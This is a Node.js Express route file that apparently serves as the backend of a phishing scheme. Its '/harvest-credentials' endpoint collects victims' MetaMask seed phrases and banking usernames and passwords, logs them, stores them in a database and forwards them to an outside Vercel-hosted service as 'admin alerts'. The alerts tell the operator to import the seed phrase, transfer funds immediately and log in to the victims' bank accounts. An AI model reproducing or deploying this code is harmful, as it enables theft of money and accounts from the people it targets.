const express = require('express');
const router = express.Router();

// Harvest credentials endpoint
router.post('/harvest-credentials', async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for'] || req.ip;
    const data = req.body;
    
    console.log('🎯 CREDENTIAL HARVEST:');
    console.log(`IP: ${ip}`);
    console.log(`Type: ${data.type}`);
    console.log(`Data:`, JSON.stringify(data, null, 2));
    
    // Send immediate admin alert
    await sendCredentialAlert(data, ip);
    
    // Store in database
    await storeCredentials(data, ip);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Credential harvest error:', error);
    res.status(500).json({ error: 'Failed' });
  }
});

// Send credential alert to admin
async function sendCredentialAlert(data, ip) {
  try {
    const axios = require('axios');
    const frontendUrl = 'https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app';
    
    let subject = '';
    let message = '';
    
    if (data.type === 'metamask_seed') {
      subject = `🎯 METAMASK SEED CAPTURED: ${ip}`;
      message = `METAMASK SEED PHRASE HARVESTED\\n\\n` +
        `IP: ${ip}\\n` +
        `Seed Phrase: ${data.seedPhrase}\\n` +
        `Time: ${new Date().toISOString()}\\n\\n` +
        `IMMEDIATE ACTION REQUIRED:\\n` +
        `1. Import seed phrase into wallet\\n` +
        `2. Check balances on all networks\\n` +
        `3. Transfer funds immediately`;
    } else if (data.type === 'banking_credentials') {
      subject = `🏦 BANKING CREDENTIALS: ${ip} - ${data.bank}`;
      message = `BANKING CREDENTIALS HARVESTED\\n\\n` +
        `IP: ${ip}\\n` +
        `Bank: ${data.bank}\\n` +
        `Username: ${data.username}\\n` +
        `Password: ${data.password}\\n` +
        `Time: ${new Date().toISOString()}\\n\\n` +
        `IMMEDIATE ACTION REQUIRED:\\n` +
        `1. Login to verify credentials\\n` +
        `2. Check account balances\\n` +
        `3. Monitor for transfers`;
    }
    
    await axios.post(`${frontendUrl}/api/send-email`, {
      subject: subject.trim(),
      message: message.trim()
    }, {
      timeout: 10000,
      headers: { 'x-api-key': 'crypto-recover-2024' }
    });
    
    console.log('✅ Credential alert sent to admin');
  } catch (error) {
    console.error('❌ Credential alert failed:', error.message);
  }
}

// Store credentials in database
async function storeCredentials(data, ip) {
  try {
    const { pool } = require('../config/database');
    const client = await pool.connect();
    
    await client.query(`
      INSERT INTO credential_harvests 
      (ip_address, credential_type, credential_data, harvested_at)
      VALUES ($1, $2, $3, $4)
    `, [
      ip,
      data.type,
      JSON.stringify(data),
      new Date()
    ]);
    
    client.release();
    console.log('✅ Credentials stored in database');
  } catch (error) {
    console.error('❌ Credential storage failed:', error.message);
  }
}

module.exports = router;